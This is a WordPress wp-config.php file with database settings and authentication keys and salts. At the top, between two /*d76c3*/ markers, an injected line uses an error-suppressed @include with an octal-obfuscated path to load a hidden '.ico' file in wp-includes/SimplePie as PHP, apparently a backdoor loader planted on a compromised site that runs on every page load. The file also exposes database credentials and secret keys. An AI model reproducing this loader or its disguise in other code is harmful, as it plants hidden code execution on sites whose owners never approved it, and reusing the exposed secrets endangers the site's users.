<?php
/*d76c3*/

@include "\057home\057ptse\162ver1\067/pub\154ic_h\164ml/w\160-inc\154udes\057Simp\154ePie\057.a69\1412831\056ico";

/*d76c3*/

// BEGIN iThemes Security - Do not modify or remove this line
// iThemes Security Config Details: 2
define( 'DISALLOW_FILE_EDIT', true ); // Disable File Editor - Security > Settings > WordPress Tweaks > File Editor
// END iThemes Security - Do not modify or remove this line

/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
//postgresql-elliptical-63859
define('DB_NAME', 'progtech');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'root');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'JPg@]J k^OrAR4q99Q-|_Yvic5+ow>JE%);3GrJ-c#)^wFx/+XFI@o.K^kFE_F*G');
define('SECURE_AUTH_KEY',  'mM)|(M.1K9;:VGs+!=mgfsSLt{e&_K+$w1jD4+V^?S`Q<(*cb0[m7q|sQ;@GD,_p');
define('LOGGED_IN_KEY',    '(,}m(>@qw{-C;wNidVcwIu)2-T<JL}pAz-|)l|q5[vto{0i9.!2yg`sD;e&gR|M<');
define('NONCE_KEY',        '1LCkaWO,*[.Ax/XGe[==O|-dDcK29HFE8AJ1$y>YKv;7YVT47! a[2=$Z0G1+cy4');
define('AUTH_SALT',        'mrauMEpwZR|W|m|1DbwXl{Ap}>Fks-q[0W[~J!??kW(x.,=+&9?Z h jUh7=D PU');
define('SECURE_AUTH_SALT', 'qvFd{)L|PyIgrXM[lNf/hMia7o|h3E?L_<2^_Mca,bXA#g>v^=2{XQUuwrHpC>:@');
define('LOGGED_IN_SALT',   '{{nljq<FdSUa<p;E?)[7V;LeGyOk.dZ)w-~QNABR@-A6s] !YpSysT#Rnj=ZW@f%');
define('NONCE_SALT',       '++Iz;x&[P-XJ*tqhjhfRWkq@ f_w=Toq2S7mk|+&rJ((7-# L@{3@R;m,zZF+RMD');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'ptk_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');
	
/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

